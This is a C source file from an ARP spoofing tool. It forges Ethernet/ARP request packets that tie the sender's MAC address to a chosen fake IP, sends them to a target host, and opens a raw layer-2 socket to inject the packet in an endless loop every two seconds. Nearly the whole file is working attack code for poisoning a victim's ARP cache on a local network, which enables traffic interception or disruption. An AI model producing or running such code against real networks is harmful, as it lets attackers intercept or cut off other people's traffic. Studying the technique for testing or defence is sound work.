//################################################################
//############ Date: September 4 2012
//############ Author: Vincent Dary
//############ File: ArpSpoof.c
//############ Licence: GPLv3
//############ Description: network and packet forge functions
//################################################################

#include "ArpSpoof.h"

// Performs a dump of a buffer in hexdecimal representation.
//
// parameters:
//		buffer: the buffer to dump
//		siez: the buffer size
//
void hex_dump(const unsigned char *buffer, size_t size)
{
        size_t i, j, len;

        for(i=0; i < size; ++i)
        {
		if(i != 0  &&  i%8 == 0  &&  i%16 != 0)
			printf("  ");

                if(buffer[i] < 16)
                        printf(" 0%x", buffer[i]);
                else
			printf(" %x", buffer[i]);

		if(i != 0  &&  ((i+1)%16 == 0  || i == size-1))
		{
			if(size%16 != 0  && i == size-1)
			{
				len = 15-((size-1)%16);

				for(j=0; j<len; ++j)
				{
					if(j+(15-len) == 7)  printf("  ");
					printf(" ..");
				}
				j = i - (15 - len);
			}
			else
				j = i - 15;

			printf("  |  ");

			for(; j<=i; ++j)
			{
				if(j%8 == 0  &&  j!= 0  &&  j%16 != 0)  printf("  ");
				if(31 < buffer[j]  &&  buffer[j] < 127)  printf("%c", buffer[j]);
				else  printf(".");
			}
			puts("");
                }
	}
        puts("");
}

// This function sets ARP packet's field, from the Ethernet layer to the ARP layer.
//
// parameters:
//		ttmtData: an ArpSpoof structure which contains the arp spoof's datas from the comand line
//		fake: an ArpPacket structure for configure the spoof arp packet
//
void set_arp_packet(const struct ArpSpoof *ttmtData, struct ArpPacket *fakeArp)
{
	memcpy(fakeArp->etherLayer.macDest, ttmtData->targetMac, ETHERNET_ADDR_LEN);
	memcpy(fakeArp->etherLayer.macSrc, ttmtData->sourceMac, ETHERNET_ADDR_LEN);
	fakeArp->etherLayer.etherType = htons(0x806);

	fakeArp->arpLayer.hardwareType = htons(0x01);
	fakeArp->arpLayer.protocolType = htons(0x800);
	fakeArp->arpLayer.hardwareAddrLength = 0x06;
	fakeArp->arpLayer.protocolAddrLength = 0x04;
	fakeArp->arpLayer.operation = htons(0x01);
	memcpy(fakeArp->arpLayer.sendHardwareAddr, ttmtData->sourceMac, ETHERNET_ADDR_LEN);
	memcpy(fakeArp->arpLayer.sendIpAddr, ttmtData->fakeIp, IPV4_ADDR_LEN);
	memcpy(fakeArp->arpLayer.targetHardwareAddr, ttmtData->targetMac, ETHERNET_ADDR_LEN);
	memcpy(fakeArp->arpLayer.TargetIpAddr, ttmtData->targetIp, IPV4_ADDR_LEN);
}

// This function opens a link layer 2 on a network interface.
//
// parameters:
//		interface: the network interface where the link layer 2 will be open
//
// return:  the socket descriptor of the link layer 2 in succes or -1
//
int open_l2_link(const char *interface)
{
	int sock = 0;
	struct sockaddr_ll iface;
	struct ifreq index;

	memset(&iface, 0,sizeof(iface));
        memset(&index, 0,sizeof(index));
	strncpy((char *)index.ifr_name, interface, IFNAMSIZ);

	sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

	if(sock < 0)
	{
                printf("[-] %s error : socket() : %s\n", __FUNCTION__, strerror(errno));
                return -1;
        }

	if(ioctl(sock, SIOCGIFINDEX, &index) < 0)
	{
		printf("[-] %s error : ioctl() : %s\n", __FUNCTION__, strerror(errno));
		return -1;
	}

	iface.sll_family = AF_PACKET;
        iface.sll_ifindex = index.ifr_ifindex;
        iface.sll_protocol = htons(ETH_P_ALL);

	if(bind(sock, (struct sockaddr *)&iface, sizeof(struct sockaddr_ll)) < 0)
	{
                printf("[-] %s error : bind() : %s\n", __FUNCTION__, strerror(errno));
                return -1;
        }

	return sock;
}


// Performs the fake arp packet injection.
//
// parameters:
//		fakeArp: an ArpPacket struture which contains the fake arp packet
//		sock: the file descriptor of the layer 2 link where will be inject the fake arp packet
//
void arp_injection(const struct ArpPacket *fakeArp, const int sock)
{
	unsigned char *buffer = NULL;
	ssize_t byteSent = 0;

	buffer = (unsigned char *) &fakeArp->etherLayer;

	printf("\n  ARP packet write on wire, %d bytes :\n\n", ARP_PACKET_LEN);
	hex_dump((const unsigned char*)buffer, sizeof(struct ArpPacket));

	while(1)
        {
		byteSent = write(sock, buffer, ARP_PACKET_LEN);

		if(byteSent < 0)
                {
			printf("[-] %s error : write() : %s\n", __FUNCTION__, strerror(errno));
                	break;
		}

		sleep(2);
	}

	close(sock);
}

// This function injects fake ARP packets on a layer 2 link.
//
void arp_spoofing(const int argc, const char *argv[])
{
        struct ArpSpoof ttmtData;
        struct ArpPacket fakeArp;
        int sock;

        if(cmd_ttmt((const int)argc, (const char**)argv, &ttmtData) < 0)
                exit(0);

        set_arp_packet(&ttmtData, &fakeArp);

        sock = open_l2_link((const char*)&ttmtData.interface);
        if(sock < 0)
        {
                puts("[-] failure to open the layer 2 link");
                exit(0);
        }

        arp_injection(&fakeArp, sock);
}



